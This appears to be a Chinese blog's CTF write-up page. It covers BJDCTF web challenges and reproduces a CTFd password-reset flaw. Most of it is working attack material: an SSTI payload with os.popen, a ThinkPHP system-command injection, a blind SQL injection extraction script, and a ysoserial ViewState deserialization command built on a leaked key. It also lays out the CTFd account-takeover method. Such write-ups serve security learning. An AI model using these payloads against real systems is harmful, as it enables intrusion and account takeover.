  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/BJDCTF/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/BJDCTF/">BJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><pre><code>{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}</code></pre><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><pre><code class="php">POST /?s=captcha HTTP/1.1
Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;get%5B%5D=cat+/flag</code></pre>
<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><pre><code class="php">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;give me a girl&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
error_reporting(0);
echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;
if (!isset($_POST[&#39;girl_friend&#39;])) {
    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);
} else {
    $girl = $_POST[&#39;girl_friend&#39;];
    if (preg_match(&#39;/\&gt;|\\\/&#39;, $girl)) {
        die(&#39;just girl&#39;);
    } else if (preg_match(&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;, $girl)) {
        echo &quot;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;
    } else {
        //duangShell~~~~
        exec($girl);
    }
}

</code></pre>
<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><pre><code class="python">username=a\&amp;password=/if(1,sleep(5),1)%23
username=a\&amp;password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23
username=a\&amp;password=/if(substr(hex(password),1,1)&lt;5,sleep(5),1)%23</code></pre>
<p>过滤:<code>=,&#39;,;</code></p>
<pre><code class="python">import requests
import time
burp0_url = &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php&quot;
burp0_cookies = {&quot;_ga&quot;: &quot;GA1.2.212283867.1584191400&quot;, &quot;_gid&quot;: &quot;GA1.2.1374622556.1584775121&quot;}
burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),1,1)&lt;5,sleep(6),1)#&quot;}
count=0
result=&quot;&quot;
while True:
    count+=1
    for i in &quot;123456789ABCDEFG&quot;:
        burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),POS,1)&lt;GUESS,sleep(5),1)#&quot;.replace(&quot;POS&quot;,str(count)).replace(&quot;GUESS&quot;,hex(ord(i)))}
        print(burp0_data[&#39;password&#39;])
        try:
            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)
            time.sleep(0.5)
        except:
            result+=chr(ord(i)-1)
            print(result)
            break
print(result)#4F68794F75464F754E646974#OhyOuFOuNdit
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</code></pre>
<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>更改cookie拿到密码</p>
<p>av11664517@1583985203.</p>
<p> <a href="https://www.bilibili.com/video/av11664517" target="_blank" rel="noopener">https://www.bilibili.com/video/av11664517</a> </p>
<p> BJD{Quantum_Mechanics_really_Ez} </p>
<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a> </p>
<pre><code>http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;configuration&gt;
&lt;system.web&gt;
&lt;machineKey validationKey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation=&quot;SHA1&quot; decryption=&quot;3DES&quot; /&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;
</code></pre><p>validationKey泄露,利用viewstatas来任意命令执行</p>
<pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;  --generator=&quot;CA0B0334&quot;  --validationalg=&quot;SHA1&quot;  --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</code></pre><h3 id="套猪"><a href="#套猪" class="headerlink" title="套猪"></a>套猪</h3><p>登陆后找到一个提示</p>
<p> L0g1n.php</p>
<p>经过输入一系列http头后拿到flag</p>
<pre><code>GET /L0g1n.php HTTP/1.1
Host: node3.buuoj.cn:25341
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)
From: root@gem-love.com
Referer: gem-love.com
Client-Ip: 127.0.0.1
Via: y1ng.vip
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103
Connection: close

</code></pre><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><pre><code class="python">import requests
import time
arr=[&quot;H&quot;, &quot;He&quot;, &quot;Li&quot;, &quot;Be&quot;, &quot;B&quot;, &quot;C&quot;, &quot;N&quot;, &quot;O&quot;, &quot;F&quot;, &quot;Ne&quot;, &quot;Na&quot;, &quot;Mg&quot;, &quot;Al&quot;, &quot;Si&quot;, &quot;P&quot;, &quot;S&quot;, &quot;Cl&quot;, &quot;Ar&quot;, &quot;K&quot;, &quot;Ca&quot;, &quot;Sc&quot;, &quot;Ti&quot;, &quot;V&quot;, &quot;Cr&quot;, &quot;Mn&quot;, &quot;Fe&quot;, &quot;Co&quot;, &quot;Ni&quot;, &quot;Cu&quot;, &quot;Zn&quot;, &quot;Ga&quot;, &quot;Ge&quot;, &quot;As&quot;, &quot;Se&quot;, &quot;Br&quot;, &quot;Kr&quot;, &quot;Rb&quot;, &quot;Sr&quot;, &quot;Y&quot;, &quot;Zr&quot;, &quot;Nb&quot;, &quot;Mo&quot;, &quot;Te&quot;, &quot;Ru&quot;, &quot;Rh&quot;, &quot;Pd&quot;, &quot;Ag&quot;, &quot;Cd&quot;, &quot;In&quot;, &quot;Sn&quot;, &quot;Sb&quot;, &quot;Te&quot;, &quot;I&quot;, &quot;Xe&quot;, &quot;Cs&quot;, &quot;Ba&quot;, &quot;La&quot;, &quot;Ce&quot;, &quot;Pr&quot;, &quot;Nd&quot;, &quot;Pm&quot;, &quot;Sm&quot;, &quot;Eu&quot;, &quot;Gd&quot;, &quot;Tb&quot;, &quot;Dy&quot;, &quot;Ho&quot;, &quot;Er&quot;, &quot;Tm&quot;, &quot;Yb&quot;, &quot;Lu&quot;, &quot;Hf&quot;, &quot;Ta&quot;, &quot;W&quot;, &quot;Re&quot;, &quot;Os&quot;, &quot;Ir&quot;, &quot;Pt&quot;, &quot;Au&quot;, &quot;Hg&quot;, &quot;Tl&quot;, &quot;Pb&quot;, &quot;Bi&quot;, &quot;Po&quot;, &quot;At&quot;, &quot;Rn&quot;, &quot;Fr&quot;, &quot;Ra&quot;, &quot;Ac&quot;, &quot;Th&quot;, &quot;Pa&quot;, &quot;U&quot;, &quot;Np&quot;, &quot;Pu&quot;, &quot;Am&quot;, &quot;Cm&quot;, &quot;Bk&quot;, &quot;Cf&quot;, &quot;Es&quot;, &quot;Fm&quot;,&quot;Md&quot;,&quot;No&quot;,&quot;Lr&quot;,&quot;Ku&quot;,&quot;Ha&quot;]

url=&quot;http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/&quot;
for i in arr:
    r=requests.get(url+i+&quot;.php&quot;)
    if r.status_code==200:
        print(r.text,end=&quot;&quot;)
    time.sleep(0.5)
</code></pre>
<p><code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code></p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>sb题目</p>
<p>index.php</p>
<pre><code class="php">&lt;?php
   $a=$_GET[&#39;yds_is_so_beautiful&#39;];
    echo unserialize($a);
   ?&gt;</code></pre>
<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>http头中找到hint:<code>home.php</code></p>
<pre><code>http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system</code></pre><p>尝试文件包含,拿到源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !== sha1(md5(&#39;y1ng&#39;))){
    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;/script&gt;&quot;;
    header(&quot;Refresh:0.1;url=index.php&quot;);
    die;
}

$str2 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;
$str3 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;
$str4 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
    &lt;title&gt;File Detector&lt;/title&gt;

    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/normalize.css&quot; /&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/demo.css&quot; /&gt;

    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/component.css&quot; /&gt;

    &lt;script src=&quot;js/modernizr.custom.js&quot;&gt;&lt;/script&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;section&gt;
    &lt;form id=&quot;theForm&quot; class=&quot;simform&quot; autocomplete=&quot;off&quot; action=&quot;system.php&quot; method=&quot;post&quot;&gt;
        &lt;div class=&quot;simform-inner&quot;&gt;
            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
            &lt;ol class=&quot;questions&quot;&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å?&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q1&quot; name=&quot;q1&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q2&quot;&gt;è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q2&quot; name=&quot;q2&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
                &lt;li&gt;
                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼GETï¼POST?&lt;/label&gt;&lt;/span&gt;
                    &lt;input id=&quot;q3&quot; name=&quot;q3&quot; type=&quot;text&quot;/&gt;
                &lt;/li&gt;
            &lt;/ol&gt;
            &lt;button class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot;&gt;æäº¤&lt;/button&gt;
            &lt;div class=&quot;controls&quot;&gt;
                &lt;button class=&quot;next&quot;&gt;&lt;/button&gt;
                &lt;div class=&quot;progress&quot;&gt;&lt;/div&gt;
                &lt;span class=&quot;number&quot;&gt;
                    &lt;span class=&quot;number-current&quot;&gt;&lt;/span&gt;
                    &lt;span class=&quot;number-total&quot;&gt;&lt;/span&gt;
                &lt;/span&gt;
                &lt;span class=&quot;error-message&quot;&gt;&lt;/span&gt;
            &lt;/div&gt;
        &lt;/div&gt;
        &lt;span class=&quot;final-message&quot;&gt;&lt;/span&gt;
    &lt;/form&gt;
    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=&quot;https://gem-love.com&quot; target=&quot;_blank&quot;&gt;@é¢å¥L&#39;Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
&lt;/section&gt;

&lt;script type=&quot;text/javascript&quot; src=&quot;js/classie.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;js/stepsForm.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
    var theForm = document.getElementById( &#39;theForm&#39; );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );
            var messageEl = theForm.querySelector( &#39;.final-message&#39; );
            form.submit();
            messageEl.innerHTML = &#39;Ok...Let me have a check&#39;;
            classie.addClass( messageEl, &#39;show&#39; );
        }
    } );
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
&lt;?php

$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;


if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) {
    $url = $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;
    $method = $_POST[&#39;q3&#39;];

    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));
}

?&gt;
</code></pre>
<p>home.php</p>
<pre><code class="php">&lt;?php

setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);
setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);

if(isset($_GET[&#39;file&#39;])){
    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#39;file&#39;])) {
        die(&quot;forbidden&quot;);
    }

    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;not now!&quot;);
    }

    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;You! are! not! my! admin!&quot;);
    }

    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#39;file&#39;])){
        die(&quot;不要套娃&quot;);
    }

    else{
        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#39;file&#39;])){
            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;
        }
        else{
            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
        }
        echo &quot;你现在访问的是&quot;.$file . &quot;&lt;br&gt;&quot;;
        require $file;
    }
} else {
    echo &quot;&lt;script&gt;location.href=&#39;./home.php?file=system&#39;&lt;/script&gt;&quot;;
}</code></pre>
<p>我们看到:</p>
<pre><code class="php">$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;    
if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</code></pre>
<p>我们利用<code>$method</code>来转义<code>%d</code>,在<code>$url</code>中加个<code>%s</code>就可以查看ssrf的内容了</p>
<p>扫描目录发现:admin.php,但是要从内网访问</p>
<p>ssrf访问得到</p>
<pre><code class="php">0 &lt;?php
error_reporting(0);
session_start();
$f1ag = &#39;f1ag{s1mpl3_SSRF_@nd_spr1ntf}&#39;; //fake

function aesEn($data, $key)
{
    $method = &#39;AES-128-CBC&#39;;
    $iv = md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] === md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] === sha1(md5(&#39;y1ng&#39;)))
        return true;
    else
        return false;
}

if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
    highlight_file(__FILE__);
} else {
    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#39;10px&#39; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];
}


$_SESSION[&#39;user&#39;] = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);

if (isset($_GET[&#39;decrypt&#39;])) {
    $decr = $_GET[&#39;decrypt&#39;];
    if (Check()){
        $data = $_SESSION[&#39;secret&#39;];
        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;
        $cipher = aesEn($data, &#39;y1ng&#39;);
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die(&#39;爬&#39;);
        }
    } else{
        header(&quot;Refresh:0.1;url=index.php&quot;);
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION[&#39;secret&#39;] = bin2hex(random_bytes($length));
}
?&gt;</code></pre>
<p>我们发现如果我们带decrypt参数直接访问,就不会生成secret了,那么<code>$cipher = aesEn(&#39;&#39;, &#39;y1ng&#39;);</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/BJDCTF/">https://www.ccreater.top/1970/01/01/BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/BJDCTF/" data-id="ckmn5754x0015s1niekbvfz3h" data-title="BJDCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-CTFd任意密码重置复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFd任意密码重置复现"><a href="#CTFd任意密码重置复现" class="headerlink" title="CTFd任意密码重置复现"></a>CTFd任意密码重置复现</h1><p>今天刚好做到一题CTFd的就顺便复现下</p>
<p>这是补丁的信息:<code>Strip spaces on registration and refine password reset</code></p>
<p>根据补丁信息去找register的代码</p>
<pre><code class="python">def register():
    errors = get_errors()
    if request.method == &quot;POST&quot;:
        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        pass_short = len(password.strip()) == 0
        pass_long = len(password) &gt; 128
        valid_email = validators.validate_email(request.form[&quot;email&quot;])
        team_name_email_check = validators.validate_email(name)

        if not valid_email:
            errors.append(&quot;Please enter a valid email address&quot;)
        if email.check_email_is_whitelisted(email_address) is False:
            errors.append(
                &quot;Only email addresses under {domains} may register&quot;.format(
                    domains=get_config(&quot;domain_whitelist&quot;)
                )
            )
        if names:
            errors.append(&quot;That user name is already taken&quot;)
        if team_name_email_check is True:
            errors.append(&quot;Your user name cannot be an email address&quot;)
        if emails:
            errors.append(&quot;That email has already been used&quot;)
        if pass_short:
            errors.append(&quot;Pick a longer password&quot;)
        if pass_long:
            errors.append(&quot;Pick a shorter password&quot;)
        if name_len:
            errors.append(&quot;Pick a longer user name&quot;)

        if len(errors) &gt; 0:
            return render_template(
                &quot;register.html&quot;,
                errors=errors,
                name=request.form[&quot;name&quot;],
                email=request.form[&quot;email&quot;],
                password=request.form[&quot;password&quot;],
            )
        else:
            with app.app_context():
                user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )
                db.session.add(user)
                db.session.commit()
                db.session.flush()

                login_user(user)

                if config.can_send_mail() and get_config(
                    &quot;verify_emails&quot;
                ):  # Confirming users is enabled and we can send email.
                    log(
                        &quot;registrations&quot;,
                        format=&quot;[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}&quot;,
                    )
                    email.verify_email_address(user.email)
                    db.session.close()
                    return redirect(url_for(&quot;auth.confirm&quot;))
                else:  # Don&#39;t care about confirming users
                    if (
                        config.can_send_mail()
                    ):  # We want to notify the user that they have registered.
                        email.sendmail(
                            request.form[&quot;email&quot;],
                            &quot;You&#39;ve successfully registered for {}&quot;.format(
                                get_config(&quot;ctf_name&quot;)
                            ),
                        )

        log(&quot;registrations&quot;, &quot;[{date}] {ip} - {name} registered with {email}&quot;)
        db.session.close()

        if is_teams_mode():
            return redirect(url_for(&quot;teams.private&quot;))

        return redirect(url_for(&quot;challenges.listing&quot;))
    else:
        return render_template(&quot;register.html&quot;, errors=errors)
</code></pre>
<p>阅读代码发现,查询用户名是否重复是直接将我们的输入拿去查询</p>
<pre><code class="python">        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()#这里这里
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        if names:
            errors.append(&quot;That user name is already taken&quot;)</code></pre>
<p>而验证没有重复后,则将我们输入的用户名strip后,在添加到数据库,也就是说我们可以在数据库弄多个同名账号</p>
<pre><code class="python">            user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )</code></pre>
<p>CTFd重置密码会收到这样的email</p>
<pre><code>Did you initiate a password reset? Click the following link to reset your password:

http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</code></pre><p>我们去找<code>/reset_password/&lt;xxx&gt;</code>的路由</p>
<pre><code class="python">@auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@ratelimit(method=&quot;POST&quot;, limit=10, interval=60)
def reset_password(data=None):
    if data is not None:
        try:
            name = unserialize(data, max_age=1800)
        except (BadTimeSignature, SignatureExpired):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]
            )
        except (BadSignature, TypeError, base64.binascii.Error):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]
            )
        if request.method == &quot;GET&quot;:
            return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)
        if request.method == &quot;POST&quot;:
            user = Users.query.filter_by(name=name).first_or_404()
            user.password = request.form[&quot;password&quot;].strip()
            db.session.commit()
            log(
                &quot;logins&quot;,
                format=&quot;[{date}] {ip} -  successful password reset for {name}&quot;,
                name=name,
            )
            db.session.close()
            return redirect(url_for(&quot;auth.login&quot;))</code></pre>
<p>我们发现,重置密码是根据用户名查出的第一个记录进行修改<code>user = Users.query.filter_by(name=name).first_or_404()</code></p>
<p>这样我们就成功覆盖了之前真实用户的密码而不是我们创建的用户</p>
